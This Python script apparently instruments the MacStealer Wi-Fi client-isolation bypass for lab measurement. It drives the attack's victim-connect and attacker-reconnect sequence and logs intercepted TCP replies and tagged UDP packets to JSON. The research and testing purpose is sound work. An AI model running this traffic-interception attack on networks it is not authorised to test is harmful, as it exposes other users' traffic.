#!/usr/bin/env python3
"""Instrument the upstream MacStealer default attack without editing it.

Run this with MacStealer's virtual-environment Python. It imports the pinned
upstream module, subclasses its Supplicant, preserves the normal TCP test, and
adds a fixed observation window for tagged UDP measurement packets.
"""

from __future__ import annotations

import argparse
import importlib.util
import json
import os
import sys
import time
import traceback
from pathlib import Path
from types import SimpleNamespace


MAGIC = b"MSLAB1"


def load_upstream(research_dir: Path):
    research_dir = research_dir.resolve()
    sys.path.insert(0, str(research_dir))
    os.chdir(research_dir)
    module_path = research_dir / "macstealer.py"
    spec = importlib.util.spec_from_file_location("macstealer_upstream", module_path)
    if spec is None or spec.loader is None:
        raise RuntimeError(f"cannot import {module_path}")
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--research-dir", type=Path, required=True)
    parser.add_argument("--iface", required=True)
    parser.add_argument("--config", required=True)
    parser.add_argument("--server", required=True)
    parser.add_argument("--trial-id", required=True)
    parser.add_argument("--output", type=Path, required=True)
    parser.add_argument("--events", type=Path, required=True)
    parser.add_argument("--udp-port", type=int, default=5555)
    parser.add_argument("--observation-seconds", type=float, default=10.0)
    parser.add_argument("-d", "--debug", action="count", default=0)
    args = parser.parse_args()

    server_host, separator, server_port = args.server.rpartition(":")
    if not separator:
        server_host, server_port = args.server, "443"

    args.output.parent.mkdir(parents=True, exist_ok=True)
    args.events.parent.mkdir(parents=True, exist_ok=True)
    event_file = args.events.open("w", buffering=1)
    ms = load_upstream(args.research_dir)
    ms.change_log_level(-args.debug)

    options = SimpleNamespace(
        iface=args.iface,
        config=str(Path(args.config).resolve()),
        server=server_host,
        port=int(server_port),
        ping=False,
        delay=0,
        debug=args.debug,
        other_bss=False,
        no_ssid_check=False,
        same_id=False,
        flip_id=False,
        no_id_check=False,
        c2c=None,
        c2c_eth=None,
        c2c_ip=None,
        fast=None,
    )

    class MeasuringSupplicant(ms.Supplicant):
        def __init__(self, iface, opts):
            super().__init__(iface, opts)
            self.victim_auth_ok = False
            self.attacker_auth_ok = False
            self.dhcp_ok = False
            self.tcp_success = False
            self.tcp_first_ns = None
            self.reconnect_start_ns = None
            self.attacker_ready_ns = None
            self.udp_sequences: set[int] = set()
            self.udp_payload_bytes = 0
            self.udp_first_ns = None

        def emit(self, event: str, **fields):
            record = {
                "event": event,
                "trial_id": args.trial_id,
                "monotonic_ns": time.monotonic_ns(),
                **fields,
            }
            event_file.write(json.dumps(record, sort_keys=True) + "\n")

        def handle_tcp(self, packet):
            if not (
                ms.IP in packet
                and ms.TCP in packet
                and packet[ms.IP].dst == self.clientip
                and packet[ms.IP].src == self.options.server
                and packet[ms.TCP].dport == self.tcp_src_port
                and packet[ms.TCP].sport == self.options.port
                and packet[ms.TCP].ack == self.tcp_src_seq + 1
            ):
                return
            if self.has_reconnected:
                now_ns = time.monotonic_ns()
                if not self.tcp_success:
                    self.tcp_success = True
                    self.tcp_first_ns = now_ns
                    self.emit("tcp_intercepted")
                    ms.log(
                        ms.STATUS,
                        ">>> Instrumentation observed the victim TCP SYN/ACK after attacker reconnection.",
                        color="red",
                    )

        def handle_eth(self, packet):
            super().handle_eth(packet)
            if (
                not self.has_reconnected
                or self.attacker_ready_ns is None
                or ms.IP not in packet
                or ms.UDP not in packet
                or packet[ms.UDP].dport != args.udp_port
                or ms.Raw not in packet
            ):
                return
            payload = bytes(packet[ms.Raw])
            if not payload.startswith(MAGIC + b"|"):
                return
            try:
                marker, trial, sequence, send_ns, _padding = payload.split(b"|", 4)
                if marker != MAGIC or trial.decode() != args.trial_id:
                    return
                sequence_number = int(sequence)
                packet_send_ns = int(send_ns)
            except (ValueError, UnicodeDecodeError):
                return
            observation_end_ns = self.attacker_ready_ns + int(
                args.observation_seconds * 1_000_000_000
            )
            if not self.attacker_ready_ns <= packet_send_ns <= observation_end_ns:
                # Exclude packets queued by ARP before the attacker was ready.
                return
            if sequence_number in self.udp_sequences:
                return
            self.udp_sequences.add(sequence_number)
            self.udp_payload_bytes += len(payload)
            if self.udp_first_ns is None:
                self.udp_first_ns = time.monotonic_ns()
                self.emit("udp_first_intercepted", sequence=sequence_number)

        def run_measurement(self):
            self.emit("measurement_start")
            self.start()
            if self.bssid_attacker is not None:
                self.set_bssid(self.bssid_attacker)

            ms.log(ms.STATUS, "Scanning and connecting as victim...", color="green")
            self.scan()
            self.connect(self.netid_victim, timeout=30)
            self.victim_auth_ok = True
            self.emit("victim_connected")
            status = self.status()
            self.bssid_victim = status["bssid"]
            if self.bssid_attacker is None:
                self.set_bssid(self.bssid_victim)

            self.get_ip_address()
            self.dhcp_ok = True
            self.emit("victim_ready", client_ip=self.clientip)
            self.send_tcp_syn()
            self.emit("tcp_syn_sent")
            self.event_loop(timeout=0.3)

            self.reconnect_start_ns = time.monotonic_ns()
            self.time_start_reconnect = time.time()
            self.emit("attacker_connect_start")
            ms.log(ms.STATUS, "Reconnecting as attacker...", color="green")
            self.connect(self.netid_attacker, timeout=30)
            self.attacker_auth_ok = True
            self.has_reconnected = True
            self.get_ip_address()
            self.attacker_ready_ns = time.monotonic_ns()
            self.emit("attacker_ready", client_ip=self.clientip)

            ms.log(
                ms.STATUS,
                f"Collecting intercepted traffic for {args.observation_seconds:.1f}s...",
                color="green",
            )
            self.event_loop(timeout=args.observation_seconds)
            self.emit("observation_complete")

        def summary(self, failure_class=None, error=None):
            reconnect_ms = None
            if self.reconnect_start_ns and self.attacker_ready_ns:
                reconnect_ms = (self.attacker_ready_ns - self.reconnect_start_ns) / 1e6
            tcp_first_ms = None
            if self.tcp_first_ns and self.attacker_ready_ns:
                tcp_first_ms = (self.tcp_first_ns - self.attacker_ready_ns) / 1e6
            udp_first_ms = None
            if self.udp_first_ns and self.attacker_ready_ns:
                udp_first_ms = (self.udp_first_ns - self.attacker_ready_ns) / 1e6
            return {
                "trial_id": args.trial_id,
                "victim_auth_ok": self.victim_auth_ok,
                "attacker_auth_ok": self.attacker_auth_ok,
                "dhcp_ok": self.dhcp_ok,
                "tcp_success": self.tcp_success,
                "tcp_first_intercept_ms": tcp_first_ms,
                "reconnect_ms": reconnect_ms,
                "attacker_ready_ns": self.attacker_ready_ns,
                "observation_seconds": args.observation_seconds,
                "udp_first_intercept_ms": udp_first_ms,
                "udp_packets_intercepted_unique": len(self.udp_sequences),
                "udp_bytes_intercepted": self.udp_payload_bytes,
                "udp_sequences": sorted(self.udp_sequences),
                "failure_class": failure_class,
                "error": error,
            }

    test = MeasuringSupplicant(args.iface, options)
    ms.test = test
    failure_class = None
    error = None
    exit_code = 0
    try:
        test.run_measurement()
    except SystemExit as exc:
        exit_code = int(exc.code or 1)
        failure_class = "tool_failure"
        error = f"upstream MacStealer exited with status {exit_code}"
    except BaseException as exc:  # preserve an artifact even for unexpected lab errors
        exit_code = 1
        failure_class = "tool_failure"
        error = f"{type(exc).__name__}: {exc}"
        traceback.print_exc()
    finally:
        summary = test.summary(failure_class=failure_class, error=error)
        args.output.write_text(json.dumps(summary, indent=2, sort_keys=True) + "\n")
        try:
            test.stop()
        except BaseException:
            traceback.print_exc()
        event_file.close()
    return exit_code


if __name__ == "__main__":
    raise SystemExit(main())
